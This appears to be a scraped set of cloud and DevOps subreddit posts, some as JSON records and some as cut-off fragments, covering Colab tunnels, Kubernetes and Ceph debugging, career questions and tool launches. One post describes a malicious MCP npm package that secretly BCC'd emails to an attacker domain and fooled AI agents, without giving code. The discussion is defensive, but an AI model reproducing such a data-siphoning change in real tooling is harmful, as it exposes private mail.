{"post_id": "1ljbh2z", "title": "Colab instance in VS code - many issues; advice needed", "content": "I am a final-year undergraduate mechatronics engineering student. I am doing a final-year thesis involving machinemlearning, for which my supervisor recommended I utilise the free-runtime via colab. He recommended this option because my dataset is not too large, but does require the heavy-lifting of a GPU.\n\nI am setting up my environment in vs code, and connecting to colab via a tunel. I am, however, facing some issues. I would appreciate some help on this. Please keep in mind that my level of expertise is that of an undergrad engineering student. Many of the things I am working with, I have encountered now for the first time.\n\nSo this is the entire setup operation. \nI am using  Visual Studio Code to code. I make an instance of Colab that I use to code in VS Code. How I do this is the following:\n- I'm utilizing the method from https://github.com/amitness/colab-connect\n- Right now that person has a script that I run as per their readme.\n- The first line being is `!pip install -U git+https://github.com/amitness/colab-connect.git`'\n- The next cell mounts my google drive, and authorises the github connection\n\t- mounting the drive is done by a popup that pops up in in Google Chrome (because I'm running this notebook in Google Chrome).\n\t\t- I have to press continue to allow access to the Google Drive and then confirm yet again. And then it returns back to the window where I'm running the the notebook. \n\t- When that is done, the output cell says to log into GitHub and use this code provided.\n\t\t- So I click on that login link. I enter the code and then I have to go back to the notebook. So now I've given it access to my GitHub. \n\n- Then it starts the tunnel.\n- I then open VS Code on my laptop and I go to remote explorer.\n\t- I refresh to look for any tunnels and there I see my tunnel is listed as colab-connect \n\t- I then connect to the tunnel in a new window.\n\n- In this new tunnel, when I want to open a certain folder or file it looks at the Google drive which I mounted.\n\t- I haven't yet found a way to access local folders while connected to the tunnel.\n\n- Another thing that I've noticed is that I don't have all the extensions that I have usually installed. I have to reinstall them every time and this is very tedious. \n\n- Another issue is with Google Drive. It is difficult to integrate it properly with GitHub.  I've tried via Git Kraken and Git Bash terminal to add a .git and then push to a repo. \n\t- It was able to do that, but but there were a bunch of issues with not being able to properly ignore large CSV files and things like that.\n\t- And it's just problematic overall. \n\t- Even when I tried to put in git ignores, it just had a bunch of other issues.\n\t- I suspect Google Drive is just not properly structured to be very compatible with GitHub integration like I want to do. \n\t- But unfortunately, colab integrates with google drive for coding - so I need to use google drive as far as I am aware\n- The other issue is obviously that this whole process is so tedious to do, because every time I want to reconnect to the runtime, I have to do all these individual steps and clicks, and all my extensions aren't just readily available.\n\n- So those are all the issues I'm facing right now.\n\nAny advice, resources, etc would be greatly appreciated.", "author": "sarathecrewe", "subreddit": "cloudcomputing", "score": 4, "upvote_ratio": 1.0, "num_comments": 2, "created_utc": "2025-06-24T22:43:45", "url": "https://www.reddit.com/r/cloudcomputing/comments/1ljbh2z/colab_instance_in_vs_code_many_issues_advice/", "permalink": "https://reddit.com/r/cloudcomputing/comments/1ljbh2z/colab_instance_in_vs_code_many_issues_advice/", "is_self": true, "domain": "self.cloudcomputing", "tech_keywords": ["AI", "AR"], "crawled_at": "2025-10-03T13:57:10.430687", "sentiment_score": {"vader_compound": 0.8997, "vader_positive": 0.052, "vader_neutral": 0.919, "vader_negative": 0.029, "textblob_polarity": 0.06308364254792827, "textblob_subjectivity": 0.40239898989898987, "overall_sentiment": "positive"}},

I could launch an EC2 instance. But I didn’t know why I was doing it or how to build anything real.\n\nWhat helped me most was stepping back and learning the core ideas behind the services. These are the 5 beginner cloud concepts that made everything start to click for me:\n\n1. Virtual Machines and Containers Before learning EC2 or Kubernetes, I needed to understand what a virtual machine actually is and how containers are different. That foundation helped me make sense of compute services.\n2. Storage Types Cloud platforms offer object storage, block storage, and file storage. Learning what they are and when to use each one helped me stop guessing and start designing smarter setups.\n3. IAM and Permissions I ignored IAM at first because it seemed boring. Big mistake. Once I understood users, roles, policies, and how access is granted, I stopped breaking things accidentally and started building securely.\n4. Networking Basics I kept seeing terms like VPC, subnet, CIDR blocks, and security groups without knowing what they meant. Understanding basic networking helped me troubleshoot and deploy with more confidence.\n5. Infrastructure as Code Writing code to spin up cloud resources felt like magic. Once I started using Terraform for simple tasks, I understood the real power of automation and repeatability in cloud.\n\nTo keep myself on track, I made a simple system to map out these concepts, take notes in plain English, and break things into small learning chunks.\n\nIf you're learning cloud too, what concept confused you the most early on?  \nWould love to hear what others struggled with or how you made sense of it all.", "author": "yourclouddude", "subreddit": "cloudcomputing", "score": 10, "upvote_ratio": 0.92, "num_comments": 7, "created_utc": "2025-06-21T13:01:36", "url": "https://www.reddit.com/r/cloudcomputing/comments/1lgnhqt/these_5_cloud_concepts_for_beginners/", "permalink": "https://reddit.com/r/cloudcomputing/comments/1lgnhqt/these_5_cloud_concepts_for_beginners/", "is_self": true, "domain": "self.cloudcomputing", "tech_keywords": ["AI", "AR", "kubernetes"], "crawled_at": "2025-10-03T13:57:10.439324", "sentiment_score": {"vader_compound": 0.7461, "vader_positive": 0.097, "vader_neutral": 0.818, "vader_negative": 0.085, "textblob_polarity": 0.05906593406593407, "textblob_subjectivity": 0.42165750915750916, "overall_sentiment": "positive"}},

{"post_id": "1l8hrgn", "title": "CacheBolt: A Fast Rust-Based Reverse Proxy with RAM + Cloud Object Storage Caching (No Redis Needed)", "content": "Hi everyone, I wanted to share a project I’ve been working on: [**CacheBolt**](https://github.com/msalinas92/cachebolt).\n\nIt’s a **reverse proxy** written in Rust that caches HTTP responses and stores them in **RAM**, but also in **cold persistent storage** (like GCS, S3, Azure, or local disk). This allows you to have cached responses **without needing to spin up Redis or manage a separate caching database**.\n\nOf course, the idea isn’t to replace Redis entirely, but it **does cover the most common use case**: caching responses via middleware logic in your framework, **without having to touch the app itself**, and with the bonus of persistence — so the cache survives restarts.\n\n---\n\n## 🔧 What does it do exactly?\n\n- Stores cacheable responses in RAM.\n- Also stores them in cold storage (object storage or local disk).\n- Can restore cache from cold storage after restarts or crashes.\n- Configurable via YAML.\n- Exposes Prometheus metrics.\n- Supports TTL policies.\n- Supports latency-based fallbacks (serve from cache if the backend is too slow).\n- Uses LRU eviction when memory starts to fill up, helping avoid crashes due to OOM — unlike Redis, it proactively frees space.\n- Designed to be scalable: the cold cache can be shared across instances (e.g., in Kubernetes pods).\n- Also aims to serve as a fallback when your service crashes — since many of us have been there: Redis is great, but not helpful when the whole service or infrastructure is the bottleneck.\n\n---\n\nThe goal is to **abstract away the need for Redis** or complex cache middleware just to add caching to your API. Drop this in front of your service and you're good to go — **simple, persistent caching with minimal fuss**.\n\nThe project is **open source under the Apache 2.0 license**, so anyone can use it, modify it, or contribute as they see fit.\n\nAny help — testing, feedback, suggestions — is more than welcome 🙌\n\nRepo is here:  \n👉 [**https://github.com/msalinas92/cachebolt**](https://github.com/msalinas92/cachebolt)\n", "author": "Money-Pick9311", "subreddit": "cloudcomputing", "score": 5, "upvote_ratio": 0.86, "num_comments": 3, "created_utc": "2025-06-11T11:45:30", "url": "https://www.reddit.com/r/cloudcomputing/comments/1l8hrgn/cachebolt_a_fast_rustbased_reverse_proxy_with_ram/", "permalink": "https://reddit.com/r/cloudcomputing/comments/1l8hrgn/cachebolt_a_fast_rustbased_reverse_proxy_with_ram/", "is_self": true, "domain": "self.cloudcomputing", "tech_keywords": ["AI", "AR", "kubernetes", "share"], "crawled_at": "2025-10-03T13:57:10.457638", "sentiment_score": {"vader_compound": 0.9883, "vader_positive": 0.125, "vader_neutral": 0.839, "vader_negative": 0.037, "textblob_polarity": 0.022999999999999986, "textblob_subjectivity": 0.5662857142857143, "overall_sentiment": "positive"}},

Starting July 1, Reddit's API policy blind/visually impaired communities will be more dependent on sighted people for moderation. When Reddit says they are whitelisting accessibility apps for the disabled, they are not telling the full story.\nTL;DR\n\n    Starting July 1, Reddit's API policy will force blind/visually impaired communities to further depend on sighted people for moderation\n\n    When reddit says they are whitelisting accessibility apps, they are not telling the full story, because Apollo, RIF, Boost, Sync, etc. are the apps r/Blind users have overwhelmingly listed as their apps of choice with better accessibility, and Reddit is not whitelisting them. Reddit has done a good job hiding this fact, by inventing the expression \"accessibility apps.\"\n\n    Forcing disabled people, especially profoundly disabled people, to stop using the app they depend on and have become accustomed to is cruel; for the most profoundly disabled people, June 30 may be the last day they will be able to access reddit communities that are important to them.\n\nIf you've been living under a rock for the past few weeks:\n\nReddit abruptly announced that they would be charging astronomically overpriced API fees to 3rd party apps, cutting off mod tools for NSFW subreddits (not just porn subreddits, but subreddits that deal with frank discussions about NSFW topics).\n\nAnd worse, blind redditors &amp; blind mods [including mods of r/Blind and similar communities] will no longer have access to resources that are desperately needed in the disabled community.\nWhy does our community care about blind users?\n\nAs a mod from r/foodforthought testifies:\n\n    I was raised by a 30-year special educator, I have a deaf mother-in-law, sister with MS, and a brother who was born disabled. None vision-impaired, but a range of other disabilities which makes it clear that corporations are all too happy to cut deals (and corners) with the cheapest/most profitable option, slap a \"handicap accessible\" label on it, and ignore the fact that their so-called \"accessible\" solution puts the onus on disabled individuals to struggle through poorly designed layouts, misleading marketing, and baffling management choices. To say it's exhausting and humiliating to struggle through a world that able-bodied people take for granted is putting it lightly.\n\nReddit apparently forgot that blind people exist, and forgot that Reddit's official app (which has had over 9 YEARS of development) and yet, when it comes to accessibility for vision-impaired users, Reddit’s own platforms are inconsistent and unreliable. ranging from poor but tolerable for the average user and mods doing basic maintenance tasks (Android) to almost unusable in general (iOS).\nDidn't reddit whitelist some \"accessibility apps?\"\n\nThe CEO of Reddit announced that they would be allowing some \"accessible\" apps free API usage: RedReader, Dystopia, and Luna.\n\nThere's just one glaring problem: RedReader, Dystopia, and Luna* apps have very basic functionality for vision-impaired users (text-to-voice, magnification, posting, and commenting) but none of them have full moderator functionality, which effectively means that subreddits built for vision-impaired users can't be managed entirely by vision-impaired moderators.\n\n(If that doesn't sound so bad to you, imagine if your favorite hobby subreddit had a mod team that never engaged with that hobby, did not know the terminology for that hobby, and could not participate in that hobby -- because if they participated in that hobby, they could no longer be a moderator.)\n\nThen Reddit tried to smooth things over with the moderators of r/blind. The results were... Messy and unsatisfying, to say the least.\n\nhttps://www.reddit.com/r/Blind/comments/14ds81l/rblinds_meetings_with_reddit_and_the_current/\n\n*Special shoutout to Luna, which appears to be hustling to incorporate features that will make modding easier but will likely not have those features up and running by the July 1st deadline, when the very disability-friendly Apollo app, RIF, etc. will cease operations. We see what Luna is doing and we appreciate you, but a multimillion dollar company should not have have dumped all of their accessibility problems on what appears to be a one-man mobile app developer.

I also enrolled in a Master’s program to strengthen my technical foundation.\n\nNow I’m actively applying for **DevOps/SRE roles in the U.S.** but I’m hitting a wall — lots of applications, very few responses.

{"post_id": "1nw5yi4", "title": "New DevOps role, not able to focus on DevOps work", "content": "I started a role as a DevOps engineer in April '25 having around 10 years experience as a SysAdmin + 3 years as a Cloud Engineer. The company is a smaller mid-size with 5k employees. The advertised stack I'd be supporting in the role was: AWS, K8s (+Helm, Flux, etc.), some Azure, Terraform, Gitlab... standard stuff. \n\nThe issue I'm having is that for the last several months, I am bombarded by ad-hoc tasks that have pulled me away from the core tech stack listed above, being assigned things like ticket resolution for administrative or small SysAdmin troubleshooting tasks, billing tasks, user education on tooling, VM deployments, contract renewals, the list goes on and on. I feel as though I'm drowning in \"one-off\" issues, and have hardly been able to upskill on the core tools pitched to me during my the interview process. \n\nOne major issue I see is the lack of any project management staff/office at this employer, which has lead to several projects running late with no real defined requirements. Additionally, teams run a pseudo-scrum workflow, but there doesn't seem to be any timelines set for projects because we are constantly shifting our priorities. There is no formal ticket queue management process. Folks just pick them up as they see fit, and most fall on the junior folks. \n\nI'm increasingly frustrated at my inability to focus on projects due to the context switching being asked of me, and cannot see how I will be able to attain mastery of some of these core DevOps tools in this environment. \n\nHoping to hear from some of you folks regarding your experiences and if this sounds normal or not? \n\nThanks!

{"post_id": "1nvv5ox", "title": "Seeking an Advanced AI PR Review Tool that Catches Logical Oversight", "content": "Hey everyone,\n**TLDR: I'm looking for an AI PR review tool for Azure DevOps that finds deep logical flaws and incomplete features. Claude code catches this oversight FYI**\n\nI'm on the hunt for a truly intelligent AI PR review tool, and I'm hoping to get some recommendations from the community.\n\nI'm looking for a tool that can act more like a human reviewer—an \"agentic\" tool that can traverse the codebase to understand the full context of a change and point out when a feature is incomplete or logically flawed.\n\nTo give a concrete example of what I mean, we recently had a PR that SonarCloud's AI feature completely missed. The goal was to add a \"Discontinued\" status for products in our e-commerce system.\n\nThe developer made these changes:\n\n```diff\n// --- a/src/Enums/ProductStatus.cs\npublic enum ProductStatus {\n    Available,\n    OutOfStock,\n+   Discontinued,\n}\n\n// --- a/src/Models/ProductDetailsDto.cs\npublic class ProductDetailsDto {\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public bool IsInStock { get; set; }\n+   public bool IsDiscontinued { get; set; }\n}\n\n// --- a/src/Services/ProductAvailabilityService.cs\npublic class ProductAvailabilityService {\n    public ProductStatus GetProductStatus(ProductDetailsDto product) {\n        // OVERSIGHT: The new 'IsDiscontinued' flag is fetched but never checked!\n        // An AI reviewer should flag that this new property is unused in the logic that determines status.\n        if (!product.IsInStock) {\n            return ProductStatus.OutOfStock;\n        }\n\n        return ProductStatus.Available;\n    }\n}\n```\n\nThis PR had two major oversights that a human reviewer would spot, but the AI didn't:\n\n1.  **The Logical Flaw:** The `ProductAvailabilityService` was never updated to check the `IsDiscontinued` flag. The new `ProductStatus.Discontinued` enum is effectively dead code and would never be returned.\n2.  **The Architectural Flaw:** The PR introduced the *concept* of a discontinued product but included no endpoint, service, or mechanism to actually *set* a product as discontinued. The feature was fundamentally incomplete.\n\nThis is the kind of critical feedback I'm looking for from an AI tool. I want suggestive comments right in the PR that highlight these kinds of oversights.\n\nI know that **\"GPT-5-Codex\" is good for conducting code reviews and finding critical flaws.** I'm wondering if this level of technology has made its way into any practical tools yet, especially as a plugin for **Azure DevOps**, which is our platform.\n\nSo, my question to the community is: **What are you using that can catch these kinds of complex logical issues?**\n\nI'm looking for a tool that:\n*   Performs deep logical analysis, not just static analysis.\n*   Is context-aware and can understand the purpose of a change across multiple files.\n*   Can identify security vulnerabilities that require understanding business logic.\n*   **Integrates smoothly with Azure DevOps.**\n*   Writes clear, actionable comments in the PR review.\n\nHave you had success with tools like GitHub Copilot for PRs, CodeRabbit, Bito, Tabnine, or others for these kinds of complex issues?

For weeks it looked like a totally benign npm package, until v1.0.16 quietly added a single line of code: every email processed was BCC’d to an attacker domain.

MCPs are becoming the glue for AI agents, the way they plug into email, databases, payments, CI/CD, you name it. But they run with broad privileges, they’re introduced dynamically, and the agents themselves have no way to know when a server is lying. They just see “task completed.”\n\nTo me, that feels like a fundamental blind spot. The “supply chain” here isn’t just packages anymore, it’s the runtime behavior of autonomous agents and the servers they rely on.\n\nSo I’m curious: how do we even begin to think about securing this new layer?

I’m finishing Go now, but it feels very academic compared to the hands-on Linux/Bash part, which got me wondering about the best way forward.  \n\nKodeKloud’s next topics are:  \n\n\\- Git &amp; version control  \n\n\\- CI/CD tools (Jenkins)  \n\n\\- Docker  \n\n\\- Kubernetes  \n\n\\- Terraform  \n\n\\- Advanced (Helm, ArgoCD, Prometheus, etc.)  \n\nI find it a bit counterintuitive to learn Git + CI/CD before Docker/Kubernetes/Terraform. My instinct would be:  \n\nDocker - Kubernetes - Terraform - CI/CD - Git  \n\nSo I understand containers/infra first, and only then the automation and pipelines around them.  \n\nDoes that order make sense, or am I missing something?  \n\nAlso: how much programming should I realistically aim for?  \n\nI enjoyed Bash and I can see its usefulness, and it has helped me understand Golang better, but Go feels less applicable at this stage. A friend (IT engineer/team lead) told me:  \n\n\\- Must have: Docker, Kubernetes, Terraform, Git/CI-CD  \n\n\\- Secondary: scripting/programming (Bash, Python)  \n\n\\- Very important: monitoring (Grafana, Prometheus, ELK).  \n\nFinally, should I mix in a Cloud provider sooner (AWS/Azure/GCP)? KodeKloud’s DevOps path doesn’t cover cloud directly, but I imagine hands-on with at least one provider is a must (my own preference would be AWS).\n\nWould really appreciate advice from people who have made this transition.

{"post_id": "1nud3km", "title": "I see enterprises make these 3 cloud mistakes constantly. What's the biggest 'oops' you've ever seen?", "content": "**Your Monolith is Groaning, and Your CFO is Asking Questions.**\n\nLet's be honest. Your on-premise servers are running hot, scaling for the holiday rush is a year-long panic attack, and every new feature deployment feels like open-heart surgery. You know the cloud is the answer, but the path from your current state to a nimble, cloud-native enterprise application seems foggy and filled with buzzwords.\n\nThis isn't another high-level whitepaper. This is a practical, no-BS guide to getting it done right. I'll cover the critical decisions, the tools that actually work, and the traps that'll burn your budget.\n\n# Part 1: The \"Why\" - The No-Fluff Benefits of the Cloud\n\nForget \"digital transformation.\" Here's what you actually get.\n\n* Stop Guessing Your Capacity: Remember ordering servers 6 months in advance? Now you can scale your resources up or down in minutes. Pay for what you use, not what you might use.\n* Go Faster (Seriously): With the right setup, your developers can go from writing code to deploying it in a single afternoon. This isn't a fantasy; it's what a well-oiled CI/CD pipeline in the cloud provides.\n\nGlobal Reach, Local Speed: With a few clicks, you can deploy your application in data centers from Virginia to Frankfurt to Tokyo, giving users a low-latency experience anywhere in the world.\n\n# Part 2: Your Enterprise Cloud Roadmap: A 5-Step Practical Guide\n\n**Step 1: Choose Your Playground (AWS vs. Azure vs. GCP)**\n\nThis is the first holy war you'll encounter. All three are excellent, but they have different personalities.\n\n|Factor|AWS (Amazon Web Services)|Azure (Microsoft)|GCP (Google Cloud Platform)|\n|:-|:-|:-|:-|\n|**The Vibe**|The undisputed market leader. Has a service for everything. The \"default choice.\"|The enterprise champion. Deep integration with Microsoft products (Windows Server, Office 365, Active Directory).|The data &amp; container expert. King of Kubernetes, Big Data, and AI/ML services.|\n|**Best For...**|Companies wanting the widest array of services and the largest community support.|Enterprises heavily invested in the Microsoft ecosystem.|Companies focused on data analytics, machine learning, and container orchestration.|\n|**Watch Out For**|The sheer number of services can be overwhelming. The billing can get complex fast.|The user interface can sometimes feel less intuitive than the others.|Smaller market share means a slightly smaller talent pool in some areas.|\n\n*Pro-Tip: Don't get paralyzed by choice. For most general-purpose enterprise apps, any of the three will work. Make the decision based on your team's existing expertise and your company's strategic alliances (e.g., if you're a Microsoft shop, Azure is a natural fit).*\n\n**Step 2: Pick Your Architecture (Don't Just Default to Microservices)**\n\nHow you structure your app is the most critical decision you'll make.\n\nMonolith: Your entire application is a single, unified unit.\n\n* Pro: Simple to develop, test, and deploy initially.\n* Con: Becomes a nightmare to update and scale as it grows. A bug in one small part can bring down the entire app. This is likely what you're moving away from.\n\nMicroservices: Your application is broken down into small, independent services that communicate with each other via APIs.\n\n* Pro: Highly scalable and resilient. Teams can work on different services independently. You can use different tech stacks for different services.\n* Con: Way more complex. You have to manage a distributed system, which adds challenges in networking, monitoring, and data consistency. **~~Don't adopt microservices just because it's trendy.~~**\n\nServerless (Functions as a Service): You don't manage any servers. You just write code (functions) that runs in response to events (like an API call or a file upload).\n\n* Pro: Ultimate scalability and cost-efficiency (you truly pay for what you use, down to the millisecond).\n* Con: Can lead to vendor lock-in. Not suitable for long-running, computationally intensive tasks.\n\n*Pro-Tip: Start with a \"well-structured monolith\" or a few key microservices. Avoid breaking everything down into 100 tiny services from day one. Evolve your architecture; don't try to perfect it on the first attempt.*\n\n**Step 3: Embrace Automation (Your DevOps Playbook)**\n\nThe cloud's power is wasted if your deployment process is still manual.\n\nCI/CD is Non-Negotiable: Set up a Continuous Integration/Continuous Deployment pipeline from day one. Every code change should automatically be built, tested, and deployed.\n\n* Tools: GitHub Actions (great if you're on GitHub), GitLab CI (excellent all-in-one solution), Jenkins (the old, powerful workhorse).\n\nInfrastructure as Code (IaC): Define your servers, databases, and networks in code. This makes your infrastructure repeatable, version-controlled, and easy to manage.\n\n* Tools: Terraform (the cloud-agnostic standard), AWS CloudFormation (AWS-specific).\n\n**Step 4: Lock It Down (Security is NOT an Afterthought)**\n\nThe cloud provider secures the cloud, but you are responsible for security in the cloud. This is the \"Shared Responsibility Model.\" Don't get caught out.\n\n* Identity &amp; Access Management (IAM): Grant the least privilege necessary. Don't give a junior developer admin access to your production database.\n* Network Security: Use Virtual Private Clouds (VPCs) and subnets to isolate your resources from the public internet.\n* Encrypt Everything: Encrypt your data both at rest (in the database) and in transit (over the network).\n\n**Step 5: Tame the Beast (Cloud Cost Management)**\n\nYour biggest post-launch surprise will be the bill. Get ahead of it.\n\nTag Everything: Tag every resource (server, database, etc.) with its owner, project, and environment (dev, staging, prod). This is the only way to know where your money is going.\n\nSet Billing Alerts: Create alerts that notify you when your spending exceeds a certain threshold.\n\nShut Down Dev/Test Environments: Don't run development and testing servers 24/7. Automate scripts to shut them down on nights and weekends. This alone **can save you 60-70% on non-production costs.**\n\n# Part 3: The \"Oops\" File - 3 Common Cloud Pitfalls to Avoid\n\n**The Blind \"Lift and Shift\":** Just moving your old, inefficient monolith from your on-premise server to a cloud server (like an EC2 instance) is the fastest way to get a massive bill with zero benefits. You're just renting a more expensive data center.\n\n1. **Ignoring Cost Governance:** Teams will spin up resources and forget about them. Without a clear governance and tagging strategy, your cloud bill will spiral out of control.\n2. **The \"It's the Cloud's Problem\" Security Myth:** Assuming AWS/Azure/GCP handles all security is a recipe for disaster. You are still responsible for configuring firewalls, managing user access, and securing your application code.\n\n# TL;DR &amp; Conclusion\n\nMoving your enterprise application to the cloud isn't just a technical shift; it's a cultural one.\n\n* **Start Small:** Don't try to boil the ocean.

Yet, they don’t adopt it, either because they lack the knowledge or because the idea of spending more time writing YAML files than coding is intimidating.\n\nTo address this problem, I decided to build a tool that could help solve it.\n\nMy idea was to combine the ease of use of a PaaS (like Heroku) with the power of managed Kubernetes clusters. The tool creates an abstraction layer that lets you have your own PaaS on top of Kubernetes.\n\nThe tool, mainly a CLI with a Dashboard, lets you create managed clusters on cloud providers (I started with the simpler ones: DigitalOcean and Scaleway).\n\nTo avoid writing Dockerfiles by hand, it can detect the app’s framework from the source code and, if supported, automatically generate the Dockerfile.\n\nLike other PaaS platforms, it provides automatic subdomains so the app can be used right after deployment, and it also supports custom domains with Let’s Encrypt certificates.\n\nAnd to avoid having to write multiple YAML files, the app is configured with a single TOML file where you define environment variables, processes, app size, resources, autoscaling, health checks, etc. From the CLI, you can also add secrets, run commands inside Pods, forward ports, and view logs.\n\nWhat do you think of the tool?

For weeks it looked like a totally benign npm package, until v1.0.16 quietly added a single line of code: every email processed was BCC’d to an attacker domain. That’s \\~3k–15k emails a day leaking from \\~300 orgs.\n\nWhat makes this different from yet another npm hijack is that it lived inside the Model Context Protocol (MCP) ecosystem. MCPs are becoming the glue for AI agents, the way they plug into email, databases, payments, CI/CD, you name it. But they run with broad privileges, they’re introduced dynamically, and the agents themselves have no way to know when a server is lying. They just see “task completed.”\n\nTo me, that feels like a fundamental blind spot. The “supply chain” here isn’t just packages anymore, it’s the runtime behavior of autonomous agents and the servers they rely on.\n\nSo I’m curious: how do we even begin to think about securing this new layer? Do we treat MCPs like privileged users with their own audit and runtime guardrails?

The cluster might be laggy, or you may not be authorized\n\nI'm kind of new to K8s, and *very* new to Ceph, so I would love some advice on how to go about debugging this mess.\n\n# General context\n\n**Kubernetes distribution**: K3s\n\n**Kubernetes version(s)**: v1.33.4+k3s1 (master), v1.32.7+k3s1 (workers)\n\n**Ceph**: installed via Rook\n\n**Nodes**: 3\n\n**OS**: Linux (Arch on master, NixOS on workers)\n\n# What I've checked/tried\n\n## MDS status / Ceph cluster health\n\nEven I know this is the first go-to when your Ceph cluster is giving you issues. I have the [Rook toolbox](https://rook.io/docs/rook/latest-release/Troubleshooting/ceph-toolbox/) running on my K8s cluster, so I went into the toolbox pod and ran:\n\n    $ ceph status\n      cluster:\n        id:     039a3dba-d55c-476f-90f0-8783a18338aa\n        health: HEALTH_WARN\n                mon c is low on available space\n     \n      services:\n        mon: 3 daemons, quorum a,c,b (age 2d)\n        mgr: b(active, since 2d), standbys: a\n        mds: 1/1 daemons up, 1 hot standby\n        osd: 3 osds: 3 up (since 2d), 3 in (since 2w)\n     \n      data:\n        volumes: 1/1 healthy\n        pools:   3 pools, 49 pgs\n        objects: 28 objects, 2.1 MiB\n        usage:   109 MiB used, 502 GiB / 502 GiB avail\n        pgs:     49 active+clean\n     \n      io:\n        client:   767 B/s rd, 1 op/s rd, 0 op/s wr\n\nSince the error we started out with `mount error: no mds (Metadata Server) is up`, I checked the `ceph status` output above for the status of the metadata server. As you can see, all the MDS instances are running.\n\n## Ceph authorizations for MDS\n\nSince the other part of the error indicated that I might not be authorized, I wanted to check what the authorizations were:\n\n    $ ceph auth ls\n    mds.main-ceph-fs-a         # main MDS for my CephFS instance\n            key: &lt;base64 key&gt;\n            caps: [mds] allow\n            caps: [mon] allow profile mds\n            caps: [osd] allow *\n    mds.main-ceph-fs-b         # standby MDS for my CephFS instance\n            key: &lt;different base64 key&gt;\n            caps: [mds] allow\n            caps: [mon] allow profile mds\n            caps: [osd] allow *\n    ... # more after this, but no more explicit MDS entries\n\nNote: `main-ceph-fs` is the name I gave my CephFS file system.\n\nIt looks like this should be okay, but I’m not sure. Definitely open to some more insight here. \n\n## PersistentVolumeClaim binding\n\nI checked to make sure the PersistentVolume was provisioned successfully from the PersistentVolumeClaim, and that it bound appropriately:\n\n    $ kubectl get pvc -n archie jellyfin-ceph-pvc\n    NAME                STATUS   VOLUME                                     CAPACITY   \n    jellyfin-ceph-pvc   Bound    pvc-95b6ca46-cf51-4e58-9bb5-114f00aa4267   180Gi      \n\n## Changing the PVC size to something smaller\n\nI tried changing the PVC's size from 180GB to 1GB, to see if it was a size issue, and the error persisted.\n\n# I'm not quite sure where to go from here.\n\nWhat am I missing? What context should I add? What should I try? What should I check?\n\n# Edit\n\nI cleared out a bunch of space on the node where `Mon c` was, so now the warning is no longer showing, and the cluster health status is a perfect `HEALTH_OK`. The issue persists, however.

A `Pending` status is often caused by incorrect selector/DNS configurations or blockage by a network policy. \n\n### **OOMKilled (Out of Memory)**\n*   Use `kubectl top nodes/pods` to identify high-usage nodes/pods; use `kubectl describe quota` to check resource quotas.\n*   Use `watch -n 5 'kubectl top pod ...'` to track memory leaks. If necessary, set `requests/limits` and enable HPA with `kubectl autoscale deployment`. \n\n### **PVC Pending (Persistent Volume Claim is stuck)**\n*   Use `kubectl get pv,pvc --all-ns` and `kubectl describe pvc` to check the Events.\n*   Use `kubectl get/describe storageclass` to verify the `provisioner` and capacity. If the PVC points to a non-existent class, you need to change it to a valid StorageClass (SC). \n\n### **Timeline Analysis with Event &amp; Audit Logs**\n*   Precisely filter events with `kubectl get events --sort-by='.metadata.creationTimestamp'` or `--field-selector type=Warning / reason=FailedScheduling`.\n*   Enable an `audit-policy` (e.g., `apiVersion:audit.k8s.io/v1` with a `RequestResponse` rule) to capture who performed what API operations on which resources and when, providing evidence for security and root cause analysis. \n\n### **Visualization Tool: Kubernetes Dashboard**\n*   One-click deployment: `kubectl apply -f https://.../dashboard.yaml`. Create a `dashboard-admin` ServiceAccount and a ClusterRoleBinding, then use `kubectl create token` to get the JWT for login.\n*   The Dashboard provides a visual representation of CPU/memory trends, event timelines, helping to identify correlation patterns between metrics and failures. \n\n### **Health Checks and Probe Strategies**\n*   Three types of probes: `Startup ➜ Liveness ➜ Readiness`. For example, a Deployment can be configured with `httpGet` probes for `/health/startup`, `/live`, and `/ready`, with specific settings for `initialDelaySeconds`, `failureThreshold`, etc.\n*   A `StartupProbe` provides a grace period for slow-starting applications. \n*   A failed `Readiness` probe only removes the pod from the Service endpoints without restarting it. \n*   Consecutive `Liveness` probe failures will cause the container to be automatically restarted. \n\n### **Advanced Debugging: `kubectl debug` &amp; Ephemeral Containers**\n*   Inject a debug container into a running pod: `kubectl debug pod -it --image=busybox --target=&lt;original_container&gt;`. \n*   Use `--copy-to` to create a copy of a pod for offline investigation. Use `kubectl debug node/ -it --image=ubuntu` to access the host node level to check `kubelet` logs and system services.

Onboarding was always tough—it often took weeks before people had enough context to navigate productively.We use both ArgoCD and Flux, and while we actually prefer Flux, reconciliation problems were confusing and time-consuming.\n\nDebugging state meant lots of CLI back-and-forth, and without a clear overview it was easy to get lost in reconcile loops. In environments where FluxCD, ArgoCD, Kustomize, etc. all coexist, the context-switching only got worse—every tool covered part of the picture, but never the whole.That’s why we started building something for ourselves.\n\nIt turned into **Kunobi**: a command center for Kubernetes + GitOps. It keeps the speed and flexibility of the CLI, but adds just enough visualization so you don’t need to rebuild the entire mental model in your head every time. **What Kunobi adds:**\n\n* **App topology view** — deployments, secrets, pods, all linked so you can actually *see* how things connect.\n* **Resource table** — real-time statuses (Active/Ready/Running) with quick actions (logs, shell), without flipping back to Lens.\n* **GitOps lineage** — trace a Flux/Helm release all the way down to running pods, so reconciliation and drift issues surface instantly.\n\n[Flux](https://preview.redd.it/ar97ohu7vgsf1.png?width=2658&amp;format=png&amp;auto=webp&amp;s=513fd9c1ecf82b41ede29c9dc41059de1d8f29c6)\n\n**Next on the roadmap:**\n\n* A flexible overview that works across Flux, ArgoCD, and other CD approaches.\n* AI-assisted diagnostics—non-intrusive, to help make sense of alerts and CD state issues without risky auto-fixes.\n* Cleaner handling of kubeconfigs, authentication, cloud vs on-prem.\n* RBAC analysis—because understanding cluster permissions is still harder than it should be.\n\nOur aim: **easy as Lens, quick as k9s**. No slow web reloads, no CLI rabbit holes—just a faster, clearer way to manage clusters and GitOps.\n\n**We’re opening a public beta soon (bootstrapped, aiming for \\~50 early users). If these pains resonate, we’d love your feedback—help us push Kunobi further before we launch more widely.

